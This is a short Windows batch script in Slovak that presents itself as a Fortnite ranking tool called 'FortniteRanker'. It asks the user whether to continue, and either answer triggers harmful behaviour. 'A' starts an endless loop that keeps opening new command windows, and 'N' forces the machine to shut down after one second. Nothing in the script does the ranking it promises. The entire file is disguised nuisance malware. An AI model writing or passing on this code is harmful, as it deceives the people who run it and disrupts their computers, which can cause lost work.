@echo off
color 4
title FortniteRanker
echo Dobry den pan %username%
echo Vitajte pri programe FortniteRanker
echo Chcete pokracovat ? (A/N)
set /p kkt=
if %kkt% == a goto loop
if %kkt% == n goto vypnut
:loop
start
timeout /t 10
start
timeout /t 10
start
timeout /t 10
goto loop
:vypnut
shutdown -s -t 1